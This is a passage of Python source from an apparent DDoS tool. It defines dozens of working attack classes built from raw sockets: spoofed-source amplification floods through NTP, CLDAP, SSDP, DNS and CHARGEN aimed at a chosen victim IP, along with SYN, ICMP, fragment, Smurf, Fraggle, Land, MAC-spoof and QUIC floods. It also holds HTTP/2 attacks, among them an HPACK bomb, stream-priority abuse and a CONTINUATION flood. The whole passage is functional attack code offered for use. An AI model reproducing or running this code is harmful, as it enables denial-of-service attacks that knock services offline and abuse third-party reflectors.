                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 11211, req), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class NTPAmplificationAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("NTP Amp - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        req = b"\x17\x00\x03\x2a" + b"\x00" * 40
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 123, req), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class CLDAPAmplificationAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("CLDAP Amp - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        req = (b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00"
               b"\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
               b"\x63\x74\x63\x6c\x61\x73\x73\x30\x00")
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 389, req), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class SSDPAmplificationAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("SSDP Amp - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        req = ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
               'MAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n').encode()
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 1900, req), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class DNSAmplificationAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("DNS Amp - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _build_dns(self):
        txid = os.urandom(2)
        header = txid + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00"
        label = os.urandom(4).hex().encode()
        qname = bytes([len(label)]) + label + b"\x03com\x00"
        return header + qname + b"\x00\xff\x00\x01"
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 53, self._build_dns()), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class ChargenAmplificationAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("CHARGEN Amp - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 19, os.urandom(4)), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class TCPAmplificationAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("TCP Amp - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self._rand_ip()
                if self._send_raw_ip(self._build_tcp_syn_packet(src, tgt, random.randint(1024, 65535), self.port), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class QDCRAttack(Layer4AttackBase):
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("QDCR - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self._rand_ip()
                dcid = os.urandom(8); scid = os.urandom(8)
                p = b"\xc0\x00\x00\x00\x00" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid + b"\x00\x00\x00\x01\xff\x00\x00\x1d"
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), 443, p), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class UDPSlowlorisHybridAttack(Layer4AttackBase):
    def __init__(self, target, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("UDP+Slowloris - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self.victim_ip.strip() if self.victim_ip else self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), random.randint(1, 65535), os.urandom(random.randint(32, 256))), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class ICMPFloodAttack(Layer4AttackBase):
    def __init__(self, target, rate, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.rate = min(rate, 20000)
    async def attack(self):
        logger.info(f"ICMP Flood - {self.rate}/s")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        payload = b"X" * 64
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = (random.choice(self.args.spoof_ip) if self.args.spoof_ip else self._rand_ip())
                icmp = struct.pack("!BBHHH", 8, 0, 0, random.randint(0, 65535), random.randint(0, 65535))
                icmp = struct.pack("!BBHHH", 8, 0, self._checksum(icmp + payload), random.randint(0, 65535), random.randint(0, 65535))
                body = icmp + payload
                ip_len = 20 + len(body)
                ip_src = socket.inet_aton(src); ip_dst = socket.inet_aton(tgt)
                iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, random.randint(0, 65535), 0, random.randint(64, 128), 1, 0, ip_src, ip_dst)
                iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, random.randint(0, 65535), 0, random.randint(64, 128), 1, self._checksum(iph), ip_src, ip_dst)
                if self._send_raw_ip(iph + body, tgt): self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class IPSpoofSYNFlood(Layer4AttackBase):
    def __init__(self, target, port, rate, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port; self.rate = min(rate, 20000)
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"IP Spoof SYN - {self.rate}/s")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = (random.choice(self.args.spoof_ip) if self.args.spoof_ip else self._rand_ip())
                if self._send_raw_ip(self._build_tcp_syn_packet(src, tgt, random.randint(1024, 65535), self.port), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class SmurfAttack(Layer4AttackBase):
    def __init__(self, broadcast_ip, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(broadcast_ip, stop_event, thread_stop, args, rate_limiter)
        self.broadcast_ip = broadcast_ip; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"Smurf to {self.broadcast_ip}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: bcast = socket.gethostbyname(self.broadcast_ip)
        except Exception: self.last_error = "dns_fail"; return
        bcast_sock = self._get_broadcast_sock()
        if bcast_sock is None: self.last_error = "no_broadcast_sock"; return
        payload = b"X" * 64
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                bcast_sock.sendto(payload, (bcast, 7)); self.packets_sent += 1
            except Exception: time.sleep(0.0005)
        try: bcast_sock.close()
        except Exception: pass

class FraggleAttack(Layer4AttackBase):
    def __init__(self, broadcast_ip, victim_ip, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(broadcast_ip, stop_event, thread_stop, args, rate_limiter)
        self.broadcast_ip = broadcast_ip; self.victim_ip = victim_ip
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"Fraggle to {self.broadcast_ip}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: bcast = socket.gethostbyname(self.broadcast_ip)
        except Exception: self.last_error = "dns_fail"; return
        bcast_sock = self._get_broadcast_sock()
        if bcast_sock is None: self.last_error = "no_broadcast_sock"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                bcast_sock.sendto(os.urandom(random.randint(32, 256)), (bcast, random.choice([7, 19])))
                self.packets_sent += 1
            except Exception: time.sleep(0.0005)
        try: bcast_sock.close()
        except Exception: pass

class ICMPFragmentFloodAttack(Layer4AttackBase):
    def __init__(self, target, rate, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.rate = min(rate, 10000)
    async def attack(self):
        logger.info(f"ICMP Frag - {self.rate}/s")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self._rand_ip()
                frag_size = random.choice([512, 1024, 1400])
                ip_len = 20 + frag_size
                ip_src = socket.inet_aton(src); ip_dst = socket.inet_aton(tgt)
                iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, random.randint(0, 65535), 0x2000, random.randint(64, 128), 17, 0, ip_src, ip_dst)
                iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, random.randint(0, 65535), 0x2000, random.randint(64, 128), 17, self._checksum(iph), ip_src, ip_dst)
                if self._send_raw_ip(iph + os.urandom(frag_size), tgt): self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class MACSpoofAttack(Layer4AttackBase):
    async def attack(self):
        if not SCAPY_AVAILABLE: self.last_error = "no_scapy"; return
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("MAC Spoof - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try:
            from scapy.all import Ether, IP, TCP, sendp
        except ImportError:
            self.last_error = "scapy_import"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
                sendp(Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(dst=self.target) / TCP(dport=80, flags="S"), verbose=False, inter=0.001)
                self.packets_sent += 1
            except Exception as e:
                self.last_error = type(e).__name__[:40]; self.error_count += 1
                time.sleep(0.0005)

class TCPTimestampSpoofAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port
        self._ts_val = random.randint(0, 2**32 - 1)
        self._ts_ecr = random.randint(0, 2**32 - 1)
        self._ts_start = time.monotonic()
        self._ts_lock = threading.Lock()
    def _next_ts(self):
        with self._ts_lock:
            elapsed = time.monotonic() - self._ts_start
            self._ts_val = (self._ts_val + int(elapsed * 1000)) & 0xFFFFFFFF
            self._ts_start = time.monotonic()
            return self._ts_val, self._ts_ecr
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("TCP Timestamp Spoof - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _build(self, src_ip, dst_ip, sport, dport):
        ts_val, ts_ecr = self._next_ts()
        ip_len = 52
        ip_src = socket.inet_aton(src_ip); ip_dst = socket.inet_aton(dst_ip)
        iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, random.randint(0, 65535), 0, random.randint(64, 128), 6, 0, ip_src, ip_dst)
        iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, random.randint(0, 65535), 0, random.randint(64, 128), 6, self._checksum(iph), ip_src, ip_dst)
        seq = random.randint(0, 2**32 - 1); window = random.choice([65535, 64240, 29200])
        options = b"\x02\x04\x05\xb4" + b"\x08\x0a" + struct.pack("!I", ts_val) + struct.pack("!I", ts_ecr) + b"\x01\x01\x01"
        do = (20 + len(options)) // 4 * 4
        tcph = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, do, 0x02, window, 0, 0) + options
        pseudo = ip_src + ip_dst + struct.pack("!BBH", 0, 6, len(tcph))
        tcs = self._checksum(pseudo + tcph)
        tcph = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, do, 0x02, window, tcs, 0) + options
        return iph + tcph
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self._rand_ip()
                if self._send_raw_ip(self._build(src, tgt, random.randint(1024, 65535), self.port), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

class PQCQUICInitialAttack(Layer4AttackBase):
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info("PQC QUIC Initial - active")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _build_pqc_initial(self):
        dcid = os.urandom(8); scid = os.urandom(8)
        header = b"\xc0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid + bytes([len(scid)]) + scid
        pqc_key_share = os.urandom(1200)
        header += b"\x00" + struct.pack(">H", len(pqc_key_share)) + pqc_key_share
        return header
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self._rand_ip()
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, self._build_pqc_initial()), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

# ============================================================================
# v65.1: Land Attack (src=dst)
# ============================================================================
class LandAttack(Layer4AttackBase):
    """v65.1: Land Attack — src IP = dst IP، مصرف CPU هدف را افزایش میدهد."""
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 80
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"LAND Attack - port {self.port}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _build_land_packet(self, ip, port):
        """v65.1: SYN packet با src=dst"""
        ip_len = 40
        ip_src = socket.inet_aton(ip); ip_dst = socket.inet_aton(ip)  # src = dst
        iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, random.randint(0, 65535), 0, random.randint(64, 128), 6, 0, ip_src, ip_dst)
        iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, random.randint(0, 65535), 0, random.randint(64, 128), 6, self._checksum(iph), ip_src, ip_dst)
        seq = random.randint(0, 2**32 - 1); window = random.randint(1024, 65535)
        tcph = struct.pack("!HHIIBBHHH", port, port, seq, 0, 0x50, 0x02, window, 0, 0)  # src port = dst port
        pseudo = ip_src + ip_dst + struct.pack("!BBH", 0, 6, len(tcph))
        tcs = self._checksum(pseudo + tcph)
        tcph = struct.pack("!HHIIBBHHH", port, port, seq, 0, 0x50, 0x02, window, tcs, 0)
        return iph + tcph
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                if self._send_raw_ip(self._build_land_packet(tgt, self.port), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

# ============================================================================
# v65.1: Jumbo Frame Injection
# ============================================================================
class JumboFrameAttack(Layer4AttackBase):
    """v65.1: Jumbo Frame — بستههای UDP با payload بزرگتر از MTU."""
    def __init__(self, target, port, stop_event, thread_stop, args, rate_limiter=None):
        super().__init__(target, stop_event, thread_stop, args, rate_limiter)
        self.port = port or 80
    async def attack(self):
        if not RawSocketManager.is_privileged(): self.last_error = "no_raw_socket"; return
        logger.info(f"Jumbo Frame - port {self.port}")
        loop = asyncio.get_running_loop()
        try: await loop.run_in_executor(self._executor, self._flood)
        finally: self._close_sock()
    def _flood(self):
        try: tgt = socket.gethostbyname(self.target)
        except Exception: self.last_error = "dns_fail"; return
        while not self.stop_event.is_set() and not self.thread_stop.is_set():
            self._rate_wait(); self.attempts += 1
            try:
                src = self._rand_ip()
                # v65.1: payload بزرگ — 9000+ bytes (Jumbo)
                payload = os.urandom(random.choice([9000, 10000, 12000, 15000]))
                if self._send_raw_ip(self._build_udp_packet(src, tgt, random.randint(1024, 65535), self.port, payload), tgt):
                    self.packets_sent += 1
            except Exception: time.sleep(0.0005)

# ============================================================================
# H2 Attack Classes — v65.1 (با force_h2 logic)
# ============================================================================
class H2Base:
    def __init__(self, host, port, stop_event, thread_stop, args, original_host=None, global_sem=None):
        self.host = host; self.port = port
        self.stop_event = stop_event; self.thread_stop = thread_stop
        self.args = args; self.original_host = original_host or host
        self.global_sem = global_sem
        self.attempts = 0; self.last_error = ""; self.error_count = 0
        self.lock = asyncio.Lock(); self._ssl_ctx = None
        self._alpn_fails = 0; self.alpn_failures = 0
        self._h2_disabled = False

    def _ctx(self):
        if self._ssl_ctx is None:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"]); self._ssl_ctx = ctx
        return self._ssl_ctx

    async def _open_h2(self):
        if self._h2_disabled and not self.args.force_h2:
            return None, None
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port, ssl=self._ctx(),
                                        server_hostname=self.original_host), timeout=5)
            alpn = w.get_extra_info('ssl_object').selected_alpn_protocol()
            if alpn != "h2" and not self.args.force_h2:
                w.close()
                try: await w.wait_closed()
                except Exception: pass
                async with self.lock:
                    self._alpn_fails += 1; self.alpn_failures += 1
                    if self._alpn_fails >= 3:
                        self._h2_disabled = True; self.last_error = "no_h2_alpn"
                return None, None
            return r, w
        except Exception as e:
            self.last_error = type(e).__name__[:40]; return None, None

class H2HPACKBombAttack(H2Base):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw); self.bombs = 0
    async def attack(self):
        if not H2_AVAILABLE: self.last_error = "no_h2_lib"; return
        r, w = await self._open_h2()
        if r is None and not self.args.force_h2:
            logger.warning("H2 HPACK Bomb - skipped (no h2 ALPN)"); return
        if w:
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        logger.info("H2 HPACK Bomb - active")
        workers = min(20, max(3, (self.args.workers or 200) // 30))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                r, w = await self._open_h2()
                if r is None: continue
                cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8",
                                                validate_outbound_headers=False, normalize_outbound_headers=False)
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection()
                conn.update_settings({h2.settings.SettingCodes.HEADER_TABLE_SIZE: 65536})
                w.write(conn.data_to_send()); await w.drain()
                for i in range(100):
                    if self.stop_event.is_set(): break
                    sid = conn.get_next_available_stream_id()
                    headers = [(":method", "GET"), (":path", f"/b{i}"), (":scheme", "https"), (":authority", self.original_host)]
                    for j in range(20): headers.append((f"x-{i}-{j}", "V" * 200))
                    conn.send_headers(sid, headers, end_stream=False)
                    async with self.lock: self.bombs += 1
                w.write(conn.data_to_send()); await w.drain()
                await asyncio.sleep(random.uniform(3, 8))
                w.close()
                try: await w.wait_closed()
                except Exception: pass
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class SPCATopologies:
    @staticmethod
    def skewed(conn, n=50):
        p = 0
        for i in range(1, n, 2):
            conn.prioritize(i, depends_on=p, weight=random.choice([1, 255]), exclusive=random.choice([True, False]))
            p = i
    @staticmethod
    def kary(conn, n=50, k=5):
        for i in range(1, n, 2):
            conn.prioritize(i, depends_on=(i-1)//k if i > 1 else 0, weight=random.randint(1, 256), exclusive=False)
    @staticmethod
    def unbalanced(conn, n=50):
        for i in range(1, n, 2):
            conn.prioritize(i, depends_on=max(0, i-random.randint(1, 10)), weight=255 if i%3==0 else random.randint(1, 100), exclusive=True)

class SPCAttack(H2Base):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw); self.streams_sent = 0
    async def attack(self):
        if not H2_AVAILABLE: self.last_error = "no_h2_lib"; return
        r, w = await self._open_h2()
        if r is None and not self.args.force_h2:
            logger.warning("SPCA - skipped (no h2 ALPN)"); return
        if w:
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        logger.info("SPCA - active")
        workers = min(15, max(3, (self.args.workers or 200) // 30))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                r, w = await self._open_h2()
                if r is None: continue
                cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
                conn = h2.connection.H2Connection(config=cfg)
                conn.initiate_connection()
                w.write(conn.data_to_send()); await w.drain()
                random.choice([SPCATopologies.skewed, SPCATopologies.kary, SPCATopologies.unbalanced])(conn, 50)
                sid = conn.get_next_available_stream_id()
                conn.send_headers(sid, [(":method", "POST"), (":path", "/"), (":scheme", "https"), (":authority", self.original_host)], end_stream=False)
                conn.send_data(sid, b"GET /?id=1 HTTP/1.1\r\n\r\n", end_stream=False)
                w.write(conn.data_to_send()); await w.drain()
                conn.reset_stream(sid, error_code=0x08)
                w.write(conn.data_to_send()); await w.drain()
                async with self.lock: self.streams_sent += 1
                w.close()
                try: await w.wait_closed()
                except Exception: pass
                await asyncio.sleep(random.uniform(0.001, 0.005))
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class ContinuationFloodAttack(H2Base):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw); self.frames_sent = 0
    async def attack(self):
        if not H2_AVAILABLE: self.last_error = "no_h2_lib"; return
        r, w = await self._open_h2()
        if r is None and not self.args.force_h2:
            logger.warning("CONT Flood - skipped (no h2 ALPN)"); return
        if w:
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        logger.info("CONT Flood - active")
        workers = min(20, max(5, (self.args.workers or 200) // 15))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        while not self.stop_event.is_set():
            sem = self.global_sem
            if sem: await sem.acquire()
            try:
                async with self.lock: self.attempts += 1
                r, w = await self._open_h2()
                if r is None: continue
                w.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"); await w.drain()
                sp = struct.pack(">HI", 0x0001, 65536)
                w.write(struct.pack(">I", len(sp))[1:] + b"\x04\x00" + struct.pack(">I", 0) + sp); await w.drain()
                sid = 1
                hp = b"\x82\x84\x87" + b"\x41" + bytes([len(self.original_host)]) + self.original_host.encode()
                w.write(struct.pack(">I", len(hp))[1:] + b"\x01\x00" + struct.pack(">I", sid) + hp); await w.drain()
                payload = b"A" * 16384
                fb = 0
                while not self.stop_event.is_set() and not self.thread_stop.is_set():
                    try:
                        w.write(struct.pack(">I", len(payload))[1:] + b"\x09\x00" + struct.pack(">I", sid) + payload)
                        await w.drain()
                        async with self.lock: self.frames_sent += 1
                        fb += 1
                        if fb >= 10: break
                    except (ConnectionResetError, BrokenPipeError): break
                w.close()
                try: await w.wait_closed()
                except Exception: pass
            except Exception as e:
                async with self.lock:
                    self.last_error = type(e).__name__[:40]; self.error_count += 1
            finally:
                if sem:
                    try: sem.release()
                    except Exception: pass

class HTTP2BombAttack(H2Base):
    MAX_STREAMS = 500
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        self.bombs_sent = 0; self.memory_amplified = 0; self.conn_attempts = 0
    @staticmethod
    def _frame(ft, fl, sid, p):
        return struct.pack(">I", len(p))[1:] + struct.pack(">BBI", ft, fl, sid & 0x7FFFFFFF) + p
    @staticmethod
    def _settings(s): return b"".join(struct.pack(">HI", i, v) for i, v in s)
    @staticmethod
    def _wu(sid, inc): return HTTP2BombAttack._frame(0x8, 0, sid, struct.pack(">I", inc & 0x7FFFFFFF))
    @staticmethod
    def _bomb(n):
        seed = bytes([0x40, 6]) + b"x-bomb" + bytes([0])
        return seed + bytes([0xbe] * n)
    async def attack(self):
        if not H2_AVAILABLE: self.last_error = "no_h2_lib"; return
        r, w = await self._open_h2()
        if r is None and not self.args.force_h2:
            logger.warning(f"HTTP/2 Bomb - skipped (no h2 ALPN)"); return
        if w:
            w.close()
            try: await w.wait_closed()
            except Exception: pass
        logger.info(f"HTTP/2 Bomb - active (max {self.MAX_STREAMS})")
        workers = min(30, max(5, (self.args.workers or 200) // 15))
        tasks = [asyncio.create_task(self._worker()) for _ in range(workers)]
        await asyncio.gather(*tasks, return_exceptions=True)
    async def _worker(self):
        PREF = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        while not self.stop_event.is_set():
            sem = self.global_sem
